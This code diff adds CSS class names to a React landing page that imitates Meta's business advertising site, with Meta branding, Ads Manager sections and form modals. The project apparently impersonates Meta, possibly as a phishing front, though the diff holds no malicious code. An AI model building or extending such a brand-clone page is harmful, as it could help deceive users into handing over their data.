@@ -509,6 +509,7 @@ const Home = () =>
 
     return (
         <>
+            <div className="meta-landing">
             {/* ===== BẮT ĐẦU GIAO DIỆN MỚI ===== */ }
 
             {/* ===== HEADER ===== */ }
@@ -520,19 +521,22 @@ const Home = () =>
                 top: 0,
                 zIndex: 100
             } }>
-                <div style={ {
-                    maxWidth: '1504px',
-                    margin: '0 auto',
-                    display: 'flex',
-                    alignItems: 'center',
-                    justifyContent: 'space-between',
-                    padding: '0 32px',
-                    height: '64px'
-                } }>
+                <div
+                    className="landing-header-row"
+                    style={ {
+                        maxWidth: '1504px',
+                        margin: '0 auto',
+                        display: 'flex',
+                        alignItems: 'center',
+                        justifyContent: 'space-between',
+                        padding: '0 32px',
+                        height: '64px'
+                    } }
+                >
                     {/* Left: Logo + Nav */ }
                     <div style={ { display: 'flex', alignItems: 'center', gap: '8px' } }>
                         <img src={ MetaLogoBlue } alt="Meta" style={ { width: '61px', objectFit: 'contain' } } />
-                        <nav style={ { marginLeft: '50px', display: 'flex', alignItems: 'center', gap: '28px' } }>
+                        <nav className="landing-nav-desktop" style={ { marginLeft: '50px', display: 'flex', alignItems: 'center', gap: '28px' } }>
                             { [ texts.navGetStarted, texts.navAdvertise, texts.navLearn, texts.navSupport ].map( ( item ) => (
                                 <span
                                     key={ item }
@@ -545,7 +549,7 @@ const Home = () =>
                     </div>
 
                     {/* Right: Create a Page + Start now */ }
-                    <div style={ { display: 'flex', alignItems: 'center', gap: '40px' } }>
+                    <div className="landing-header-actions" style={ { display: 'flex', alignItems: 'center', gap: '40px' } }>
                         <span style={ { cursor: 'pointer', color: '#0A1317', fontWeight: '400', fontSize: '14px', whiteSpace: 'nowrap' } }>
                             { texts.createPage }
                         </span>
@@ -571,7 +575,7 @@ const Home = () =>
             {/* ===== END HEADER ===== */ }
 
             {/* ===== HERO SECTION ===== */ }
-            <section style={ { padding: '80px 24px' } }>
+            <section className="landing-hero" style={ { padding: '80px 24px' } }>
                 <div style={ {
                     maxWidth: '1504px',
                     margin: '0 auto',
@@ -582,22 +586,25 @@ const Home = () =>
                 } }>
 
                     {/* Title wrapper */ }
-                    <div style={ { width: '80%', padding: '0 24px' } }>
-                        <h1 style={ {
-                            fontSize: '3.5rem',
-                            fontWeight: '550',
-                            color: '#1C2B33',
-                            textAlign: 'center',
-                            lineHeight: '1.15',
-                            margin: 0,
-                            display: 'block'
-                        } }>
+                    <div className="landing-hero-title-wrap" style={ { width: '80%', padding: '0 24px' } }>
+                        <h1
+                            className="landing-hero-heading"
+                            style={ {
+                                fontSize: '3.5rem',
+                                fontWeight: '550',
+                                color: '#1C2B33',
+                                textAlign: 'center',
+                                lineHeight: '1.15',
+                                margin: 0,
+                                display: 'block'
+                            } }
+                        >
                             { texts.landingHeroTitle }
                         </h1>
                     </div>
 
                     {/* Subtitle wrapper */ }
-                    <div style={ { width: '60%' } }>
+                    <div className="landing-hero-lead" style={ { width: '60%' } }>
                         <p style={ {
                             fontSize: '16px',
                             color: '#5D6C7B',
@@ -633,7 +640,7 @@ const Home = () =>
                     </div>
 
                     {/* Video */ }
-                    <div style={ { width: '60%', margin: '80px auto 0' } }>
+                    <div className="landing-hero-video" style={ { width: '60%', margin: '80px auto 0' } }>
                         <div style={ {
                             position: 'relative',
                             width: '100%',
@@ -720,12 +727,12 @@ const Home = () =>
             {/* ===== END HERO SECTION ===== */ }
 
             {/* ===== TRUSTED EXPERTS SECTION ===== */ }
-            <section style={ { padding: '80px 32px' } }>
+            <section className="landing-trusted" style={ { padding: '80px 32px' } }>
                 <div style={ {
                     maxWidth: '1504px',
                     margin: '0 auto'
                 } }>
-                    <div style={ { maxWidth: '83%' } }>
+                    <div className="landing-trusted-copy" style={ { maxWidth: '83%' } }>
                         <p style={ {
                             fontSize: '36px',
                             fontWeight: '500',
@@ -752,9 +759,9 @@ const Home = () =>
             {/* ===== END TRUSTED EXPERTS SECTION ===== */ }
 
             {/* ===== EXPLORE SECTION ===== */ }
-            <section style={ { padding: '0 32px 80px' } }>
+            <section className="landing-explore" style={ { padding: '0 32px 80px' } }>
                 <div style={ { maxWidth: '1504px', margin: '0 auto' } }>
-                    <h2 style={ {
+                    <h2 className="landing-explore-heading" style={ {
                         fontSize: '36px',
                         fontWeight: '500',
                         color: '#1C2B33',
@@ -769,9 +776,9 @@ const Home = () =>
             {/* ===== END EXPLORE SECTION ===== */ }
 
             {/* ===== FEATURE CARDS SECTION ===== */ }
-            <section style={ { paddingBottom: '80px' } }>
+            <section className="landing-features" style={ { paddingBottom: '80px' } }>
                 <div style={ { maxWidth: '1504px', margin: '0 auto', padding: '40px 32px 0' } }>
-                    <div style={ { display: 'flex', flexWrap: 'wrap', margin: '0 -12px' } }>
+                    <div className="landing-features-grid" style={ { display: 'flex', flexWrap: 'wrap', margin: '0 -12px' } }>
                         { [
                             {
                                 icon: (
@@ -844,7 +851,11 @@ const Home = () =>
                                 desc: texts.adFormatsDesc
                             }
                         ].map( ( card, index ) => (
-                            <div key={ index } style={ { width: 'calc(33.333% - 24px)', margin: '0 12px 24px', minWidth: '280px', flex: '1 1 280px' } }>
+                            <div
+                                key={ index }
+                                className="landing-feature-cell"
+                                style={ { width: 'calc(33.333% - 24px)', margin: '0 12px 24px', minWidth: '280px', flex: '1 1 280px' } }
+                            >
                                 <div style={ {
                                     background: '#fff',
                                     borderRadius: '24px',
@@ -880,7 +891,7 @@ const Home = () =>
                                         } }>
                                             { card.title }
                                         </h3>
-                                        <div style={ { fontSize: '16px', color: '#5D6C7B', lineHeight: '1.5' } }>
+                                        <div className="landing-feature-desc" style={ { fontSize: '16px', color: '#5D6C7B', lineHeight: '1.5' } }>
                                             { card.desc }
                                         </div>
                                     </div>
@@ -893,10 +904,10 @@ const Home = () =>
             {/* ===== END FEATURE CARDS SECTION ===== */ }
 
             {/* ===== TOOLS SECTION ===== */ }
-            <section style={ { padding: '0 0 0' } }>
-                <div style={ { maxWidth: '1504px', margin: '0 auto', padding: '80px 32px' } }>
+            <section className="landing-tools" style={ { padding: '0 0 0' } }>
+                <div className="landing-tools-inner" style={ { maxWidth: '1504px', margin: '0 auto', padding: '80px 32px' } }>
 
-                    <h1 style={ {
+                    <h1 className="landing-tools-heading" style={ {
                         fontSize: '36px',
                         fontWeight: '500',
                         color: '#1C2B33',
@@ -906,10 +917,10 @@ const Home = () =>
                         { texts.toolsTitle }
                     </h1>
 
-                    <div style={ { display: 'flex', alignItems: 'stretch', gap: '80px' } }>
+                    <div className="landing-tools-layout" style={ { display: 'flex', alignItems: 'stretch', gap: '80px' } }>
 
                         {/* LEFT: Accordion */ }
-                        <div style={ { width: '40%', flexShrink: 0, borderTop: '1px solid #e5e7eb' } }>
+                        <div className="landing-tools-accordion" style={ { width: '40%', flexShrink: 0, borderTop: '1px solid #e5e7eb' } }>
                             { [
                                 {
                                     id: 'ads_manager',
@@ -997,7 +1008,7 @@ const Home = () =>
                         </div>
 
                         {/* RIGHT: Video */ }
-                        <div style={ { flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center' } }>
+                        <div className="landing-tools-video-wrap" style={ { flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center' } }>
                             <div style={ {
                                 maxWidth: '470px',
                                 width: '100%',
@@ -1067,9 +1078,9 @@ const Home = () =>
             {/* ===== END TOOLS SECTION ===== */ }
 
             {/* ===== INSPIRED SECTION ===== */ }
-            <section style={ { padding: '80px 0' } }>
-                <div style={ { maxWidth: '1240px', margin: '0 auto', padding: '0 24px' } }>
-                    <h2 style={ {
+            <section className="landing-inspired" style={ { padding: '80px 0' } }>
+                <div className="landing-inspired-inner" style={ { maxWidth: '1240px', margin: '0 auto', padding: '0 24px' } }>
+                    <h2 className="landing-inspired-heading" style={ {
                         fontSize: '36px',
                         fontWeight: '500',
                         color: '#1C2B33',
@@ -1080,7 +1091,7 @@ const Home = () =>
                         { texts.inspiredTitle }
                     </h2>
 
-                    <div style={ { display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '0 80px', rowGap: '48px' } }>
+                    <div className="landing-inspired-grid" style={ { display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '0 80px', rowGap: '48px' } }>
                         { [
                             {
                                 id: 'streetwear',
@@ -1186,18 +1197,21 @@ const Home = () =>
             {/* ===== END INSPIRED SECTION ===== */ }
 
             {/* ===== REACH CUSTOMERS SECTION ===== */ }
-            <section style={ { padding: '80px 24px' } }>
-                <div style={ {
-                    maxWidth: '1240px',
-                    margin: '0 auto',
-                    display: 'flex',
-                    alignItems: 'center',
-                    justifyContent: 'space-between',
-                    gap: '40px'
-                } }>
+            <section className="landing-reach" style={ { padding: '80px 24px' } }>
+                <div
+                    className="landing-reach-row"
+                    style={ {
+                        maxWidth: '1240px',
+                        margin: '0 auto',
+                        display: 'flex',
+                        alignItems: 'center',
+                        justifyContent: 'space-between',
+                        gap: '40px'
+                    } }
+                >
                     {/* Left */ }
-                    <div style={ { flex: '1 1 50%' } }>
-                        <h2 style={ {
+                    <div className="landing-reach-copy" style={ { flex: '1 1 50%' } }>
+                        <h2 className="landing-reach-heading" style={ {
                             fontSize: '36px',
                             fontWeight: '500',
                             color: '#1C2B33',
@@ -1216,7 +1230,7 @@ const Home = () =>
                         } }>
                             { texts.reachDesc }
                         </p>
-                        <div style={ { display: 'flex', alignItems: 'center', gap: '32px' } }>
+                        <div className="landing-reach-actions" style={ { display: 'flex', alignItems: 'center', gap: '32px' } }>
                             {/* Learn more button */ }
                             <div
                                 id="reach-learn-more"
@@ -1254,7 +1268,7 @@ const Home = () =>
                     </div>
 
                     {/* Right: Image */ }
-                    <div style={ { flex: '1 1 50%' } }>
+                    <div className="landing-reach-visual" style={ { flex: '1 1 50%' } }>
                         <img
                             src={ MediaImg }
                             alt={ texts.mediaIllustrationAlt }
@@ -1266,23 +1280,23 @@ const Home = () =>
             {/* ===== END REACH CUSTOMERS SECTION ===== */ }
 
             {/* ===== STAY CONNECTED SECTION ===== */ }
-            <section style={ { background: '#fff', padding: '80px 0' } }>
-                <div style={ { maxWidth: '1240px', margin: '0 auto', padding: '0 24px' } }>
+            <section className="landing-stay" style={ { background: '#fff', padding: '80px 0' } }>
+                <div className="landing-stay-inner" style={ { maxWidth: '1240px', margin: '0 auto', padding: '0 24px' } }>
 
                     {/* Header */ }
-                    <div style={ { marginBottom: '40px' } }>
+                    <div className="landing-stay-intro" style={ { marginBottom: '40px' } }>
                         <p style={ { fontSize: '12px', color: '#5D6C7B', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: '8px' } }>
                             { texts.metaTechnologiesEyebrow }
                         </p>
-                        <h2 style={ { fontSize: '36px', fontWeight: '500', color: '#1C2B33', display: 'block', margin: 0 } }>
+                        <h2 className="landing-connected-heading" style={ { fontSize: '36px', fontWeight: '500', color: '#1C2B33', display: 'block', margin: 0 } }>
                             { texts.connectedTitle }
                         </h2>
                     </div>
 
-                    <div style={ { display: 'flex', flexDirection: 'row', gap: '40px', alignItems: 'flex-start' } }>
+                    <div className="landing-stay-row" style={ { display: 'flex', flexDirection: 'row', gap: '40px', alignItems: 'flex-start' } }>
 
                         {/* Platform icons column */ }
-                        <div style={ { display: 'flex', flexDirection: 'column', gap: '24px', paddingTop: '80px', minWidth: '32px', flexShrink: 0 } }>
+                        <div className="landing-stay-icons" style={ { display: 'flex', flexDirection: 'column', gap: '24px', paddingTop: '80px', minWidth: '32px', flexShrink: 0 } }>
                             { [
                                 { id: 'facebook', label: texts.footerFcMetaFb, src: FbIcon },
                                 { id: 'messenger', label: texts.footerFcMetaMsg, src: MessengerIcon },
@@ -1306,7 +1320,7 @@ const Home = () =>
                         </div>
 
                         {/* Video */ }
-                        <div style={ { position: 'relative', maxWidth: '504px', width: '100%', flexShrink: 0, padding: '0 16px' } }>
+                        <div className="landing-stay-video" style={ { position: 'relative', maxWidth: '504px', width: '100%', flexShrink: 0, padding: '0 16px' } }>
                             <div style={ { borderRadius: '24px', overflow: 'hidden', aspectRatio: '3/4' } }>
                                 <video
                                     ref={ fansVideoRef }
@@ -1353,11 +1367,11 @@ const Home = () =>
                         </div>
 
                         {/* Content */ }
-                        <div style={ { flex: 1, paddingTop: '160px', paddingLeft: '40px' } }>
+                        <div className="landing-stay-content" style={ { flex: 1, paddingTop: '160px', paddingLeft: '40px' } }>
                             <p style={ { fontSize: '14px', color: '#5D6C7B', marginBottom: '8px', fontWeight: '400' } }>
                                 { texts.marketingOnFacebookEyebrow }
                             </p>
-                            <h3 style={ {
+                            <h3 className="landing-stay-heading" style={ {
                                 fontSize: '36px',
                                 fontWeight: '500',
                                 color: '#1C2B33',
@@ -1392,16 +1406,19 @@ const Home = () =>
             {/* ===== END STAY CONNECTED SECTION ===== */ }
 
             {/* ===== SUPPORT SECTION ===== */ }
-            <section style={ { background: '#f6f6f6', padding: '56px 0' } }>
-                <div style={ {
-                    maxWidth: '1504px',
-                    margin: '0 auto',
-                    padding: '0 24px',
-                    display: 'flex',
-                    flexDirection: 'row',
-                    alignItems: 'center',
-                    gap: '64px'
-                } }>
+            <section className="landing-support" style={ { background: '#f6f6f6', padding: '56px 0' } }>
+                <div
+                    className="landing-support-row"
+                    style={ {
+                        maxWidth: '1504px',
+                        margin: '0 auto',
+                        padding: '0 24px',
+                        display: 'flex',
+                        flexDirection: 'row',
+                        alignItems: 'center',
+                        gap: '64px'
+                    } }
+                >
 
                     {/* Left: Video (order 1 on desktop) */ }
                     <div style={ { position: 'relative', flex: '1 1 50%', display: 'flex', justifyContent: 'center' } }>
@@ -1488,7 +1505,7 @@ const Home = () =>
                     </div>
 
                     {/* Right: Text content (order 2 on desktop) */ }
-                    <div style={ { flex: '1 1 50%' } }>
+                    <div className="landing-support-copy" style={ { flex: '1 1 50%' } }>
                         <div style={ { maxWidth: '500px' } }>
                             <p style={ {
                                 fontSize: '12px',
@@ -1500,7 +1517,7 @@ const Home = () =>
                             } }>
                                 { texts.supportCentreEyebrow }
                             </p>
-                            <h2 style={ {
+                            <h2 className="landing-support-heading" style={ {
                                 fontSize: '40px',
                                 fontWeight: '500',
                                 color: '#1C2B33',
@@ -1537,7 +1554,7 @@ const Home = () =>
             {/* ===== END SUPPORT SECTION ===== */ }
 
             {/* ===== RESOURCES SECTION ===== */ }
-            <section style={ {
+            <section className="landing-resources" style={ {
                 width: '100%',
                 padding: '100px 16px',
                 display: 'flex',
@@ -1591,7 +1608,7 @@ const Home = () =>
 
                 {/* Newsletter section */ }
                 <div style={ { maxWidth: '1175px', margin: '0 auto', padding: '80px 24px' } }>
-                    <div style={ { display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '40px', alignItems: 'start' } }>
+                    <div className="landing-footer-newsletter" style={ { display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '40px', alignItems: 'start' } }>
                         <div>
                             <h2 style={ { fontSize: '30px', fontWeight: '600', color: '#fff', lineHeight: '1.3', marginBottom: '16px', display: 'block' } }>
                                 { texts.footerUpdateTitle }
@@ -1600,8 +1617,8 @@ const Home = () =>
                                 { texts.footerUpdateDesc }
                             </p>
                         </div>
-                        <div style={ { width: '100%', maxWidth: '540px' } }>
-                            <div style={ { display: 'flex', gap: '16px', marginBottom: '16px' } }>
+                        <div className="landing-footer-form" style={ { width: '100%', maxWidth: '540px' } }>
+                            <div className="landing-footer-form-fields" style={ { display: 'flex', gap: '16px', marginBottom: '16px' } }>
                                 <input
                                     type="email"
                                     placeholder={ texts.emailAddressPlaceholder || "Email address" }
@@ -1629,7 +1646,7 @@ const Home = () =>
                 {/* Navigation grid */ }
                 <div style={ { background: '#1b2a34', color: '#9ca3af' } }>
                     <div style={ { maxWidth: '1175px', margin: '0 auto', padding: '80px 24px' } }>
-                        <div style={ { display: 'grid', gridTemplateColumns: 'repeat(7, 1fr)', gap: '32px 24px' } }>
+                        <div className="landing-footer-nav-grid" style={ { display: 'grid', gridTemplateColumns: 'repeat(7, 1fr)', gap: '32px 24px' } }>
                             { [
                                 {
                                     colId: 'tech',
@@ -1750,7 +1767,7 @@ const Home = () =>
 
                         {/* Bottom bar */ }
                         <div style={ { borderTop: '1px solid #465A69', paddingTop: '48px', marginTop: '48px' } }>
-                            <div style={ { display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', gap: '24px' } }>
+                            <div className="landing-footer-bottom" style={ { display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', gap: '24px' } }>
                                 {/* Copyright + Social icons */ }
                                 <div>
                                     <p style={ { color: '#cbd2d9', fontSize: '13px', marginBottom: '16px' } }>{ texts.footerCopyrightNotice }</p>
@@ -1808,6 +1825,7 @@ const Home = () =>
                 </div>
             </footer>
             {/* ===== END FOOTER ===== */ }
+            </div>
 
             {/* Modals - giữ nguyên, không chỉnh sửa */ }
             <FirstFormModal show={ showFirstModal } onClose={ () => setShowFirstModal( false ) } onSubmit={ handleFirstFormSubmit } texts={ texts } />
